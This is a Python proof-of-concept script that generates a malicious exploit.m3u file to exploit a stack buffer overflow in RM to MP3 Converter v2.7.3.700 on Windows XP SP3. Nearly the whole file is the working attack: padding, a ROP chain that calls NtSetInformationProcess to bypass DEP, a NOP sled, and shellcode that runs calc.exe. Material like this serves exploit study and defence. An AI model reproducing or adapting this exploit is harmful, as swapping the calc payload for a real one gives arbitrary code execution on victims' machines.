#!/usr/bin/env python3

# Exploit file to pop calc.exe for RM to MP3 Converter v2.7.3.700 on Windows XP.
# How 2 use:
#   Generate the exploit.m3u file by running this script
# 	Wait for the application to load completely
#   Load the exploit.m3u file into the RM to MP3 Converter
#
# Note: uses NtSetInformationProcess to defeat DEP.
# Tested on Windows XP SP3.

filename = "exploit.m3u"

print("Creating '" + filename + "' exploit file...")

# Uses hardcoded `kernel32.WinExec("calc")` and hardcoded `msvcrt.exit()`
# We cannot use `kernel32.ExitProcess()` because it has a `0x0A` byte.
exploit = "A"*35021		            # Padding

# Save `esp` into `edi` for shellcode address pointer
exploit += "\x77\x92\xD7\x5A"		# push esp
									# mov eax, edx
									# pop edi
exploit += "AAAA"					# Padding

# Move `edi` into `eax`									
exploit += "\x15\x6D\x8A\x5B"		# push edi
									# pop eax
									# ret
# Save `eax` into `esi`
exploit += "\x7F\x17\x5D\x77"		# push eax
									# pop esi
									# ret

# Add `eax` to point to shellcode (+ 0xC8)
exploit += "\x4D\x12\x55\x77"		# add eax, 0x64
									# ret
exploit += "\x4D\x12\x55\x77"		# add eax, 0x64
									# ret

# Jump over NtSetInformationProcess stack to set up
exploit += "\x97\x92\x01\x10"		# add esp, 0x18
									# ret

# NtSetInformationProcess stack
exploit += "\x9E\xDC\x90\x7C"		# NtSetInformationProcess (0x7C90DC9E)
exploit += "BBBB"					# Return Shellcode address
exploit += "\xFF\xFF\xFF\xFF"		# Process ID (Current process)
exploit += "CCCC"					# ProcessExecuteFlags (0x22)
exploit += "\x40\xEA\x03\x10"		# &ExecuteFlags (&0x00000002); must be writable
exploit += "EEEE"					# sizeof(ExecuteFlags) (0x4)

# NtSetInformationProcess return address
exploit += "\x49\xD3\xBA\x7C"		# mov [esi + 0x18], eax
									# pop esi
									# ret
exploit += "AAAA"					# Padding for `esi`

# Restore `esi`
exploit += "\x15\x6D\x8A\x5B"		# push edi
									# pop eax
									# ret
exploit += "\x7F\x17\x5D\x77"		# push eax
									# pop esi
									# ret
# NtSetInformationProcess parameter 2
# Set `eax` to 0x300
exploit += "\xB4\x57\xA0\x7C"		# xor eax, eax
									# ret
exploit += "\x14\x15\x94\x3D"		# add eax, 0x20
									# ret
exploit += "\xE7\x16\xEA\x77"		# add eax, 0x2
									# ret
exploit += "\x09\xC1\xDD\x73"		# mov [esi + 0x20], eax
									# pop esi
									# ret
exploit += "AAAA"					# Padding for `esi`

# Restore `esi`
exploit += "\x15\x6D\x8A\x5B"		# push edi
									# pop eax
									# ret
exploit += "\x7F\x17\x5D\x77"		# push eax
									# pop esi
									# ret

# Restore `esi`
exploit += "\x15\x6D\x8A\x5B"		# push edi
									# pop eax
									# ret
exploit += "\x7F\x17\x5D\x77"		# push eax
									# pop esi
									# ret

# NtSetInformationProcess parameter 4
exploit += "\xBB\x5A\xAE\x01"		# xor eax, eax
									# ret
exploit += "\xE7\x16\xEA\x77"		# add eax, 0x2
									# ret
exploit += "\xE7\x16\xEA\x77"		# add eax, 0x2
									# ret
exploit += "\x96\x7C\x50\x77"		# mov [esi + 0x28], eax
									# mov eax, esi
									# pop esi
									# ret

# Move `esp` back to NtSetInformationProcess stack
# Move `edi` into `eax`, add 0x14 to `eax`, swap `esp` with `eax`
exploit += "\x15\x6D\x8A\x5B"		# push edi
									# pop eax
									# ret
exploit += "\x20\xDE\x18\x3E"		# add eax, 0x14
									# adc edx, 0
									# pop ebp
									# ret 4
exploit += "AAAA"					# Padding for `ebp`
exploit += "\xFF\xA6\xAE\x01"		# xchg esp, eax
									# ret
exploit += "AAAA"					# Padding for `ret 4`

exploit += "\x90"*100				# Use `nop` sled to catch return to shellcode

# Shellcode for `kernel32.WinExec("calc")`
exploit += "\x31\xC9"               # xor ecx, ecx
exploit += "\x51"                   # push ecx
exploit += "\x68\x63\x61\x6C\x63"   # push 'calc'
exploit += "\x6A\x01"               # push 0x1
exploit += "\x8D\x4C\x24\x04"       # lea ecx, [esp + 0x4]
exploit += "\x51"                   # push ecx
exploit += "\xB8\x5D\x2B\x86\x7C"   # mov eax, 0x7C862B5D (`kernel32.WinExec`)
exploit += "\xFF\xD0"               # call eax

# Shellcode for `msvcrt.exit()`
# because the exception will keep triggering.
exploit += "\x31\xC9"               # xor ecx, ecx
exploit += "\x51"                   # push ecx
exploit += "\xB8\x84\x9E\xC3\x77"   # mov eax, 0x77C39E4 (`msvcrt.exit`)
exploit += "\xFF\xD0"               # call eax

# Write the file
with open(filename, "wb") as f:
    # Encoding iso8859-1 to preserve extended ASCII range!
    f.write(exploit.encode('iso8859-1'))

print("Exploit file '" + filename + "' created!")